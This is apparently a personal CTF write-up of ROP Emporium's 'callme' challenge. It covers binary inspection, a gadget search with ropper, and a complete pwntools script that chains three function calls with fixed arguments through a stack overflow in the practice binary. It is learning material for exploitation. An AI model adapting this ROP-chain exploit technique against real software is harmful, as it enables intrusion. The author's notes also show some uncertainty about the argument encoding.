# Challenge 3 - callme
## Description
This is the third of the ROP Emporium challenges. [callme](https://ropemporium.com/challenge/split.html)

Chain calls to multiple imported methods with specific arguments and see how the differences between 64 & 32 bit calling conventions affect your ROP chain.

Let's inspect the binary
```
mfumega@pwn-boy:/pwn-boy$ file callme
callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
mfumega@pwn-boy:/pwn-boy$
mfumega@pwn-boy:/pwn-boy$ pwn checksec callme
[*] '/pwn-boy/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'.'
    Stripped:   No
mfumega@pwn-boy:/pwn-boy$
```

And now with this in mind, we run it and prompts for our input just like the challenges before. 

If we look at the functions of the binary, we now find 3 functions called `callme_one, callme_two and callme_three`, and based on the information that the page gave us, we know that we must call this functions in the above order, with the arguments `0xdeadbeef, 0xcafebabe, 0xd00df00d`. Like this:
`callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)`.

From the previous challenge we know how to pass an argument to a function, we did it with RDI, and we already saw that the second and third arguments are passed with "RSI" and "RDX". 

Let's see which gadgets we have on the binary and filter by "pop rdi" to avoid a giant gadgets list.

```
mfumega@pwn-boy:/pwn-boy$ ropper --file callme --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: callme
0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
0x00000000004009a3: pop rdi; ret;

mfumega@pwn-boy:/pwn-boy$
```

Ok, so we actually have the one that we want. Let's write down all the addresses we have until now. 

I wrote the exploit using that gadget but didn't work, so instead I've used this gadgets:
```
pop_rdi = 0x4009a3
pop_rsi_rdx = 0x40093d
```

Also I have to pass the arguments directly in little endian. *I need to look this understand it better.*

```python
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
binary_path = '/pwn-boy/callme'
p = process(binary_path)
e = p.elf

# Addresses
callme_one = e.plt['callme_one']
callme_two = e.plt['callme_two']
callme_three = e.plt['callme_three']
pop_rdi = 0x4009a3
pop_rsi_rdx = 0x40093d

offset = 40

payload = b'A' * offset
payload += p64(pop_rdi) +  b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
payload += p64(pop_rsi_rdx)
payload += b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + b'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0'
payload += p64(callme_one)
payload += p64(pop_rdi) + b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
payload += p64(pop_rsi_rdx)
payload += b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + b'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0'
payload += p64(callme_two)
payload += p64(pop_rdi) + b'\xef\xbe\xad\xde\xef\xbe\xad\xde'
payload += p64(pop_rsi_rdx)
payload += b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca' + b'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0'
payload += p64(callme_three)

p.send(payload)
response = p.recvall()
print(response.decode())
```

This is the final exploit to get the flag. See you on the next one! 

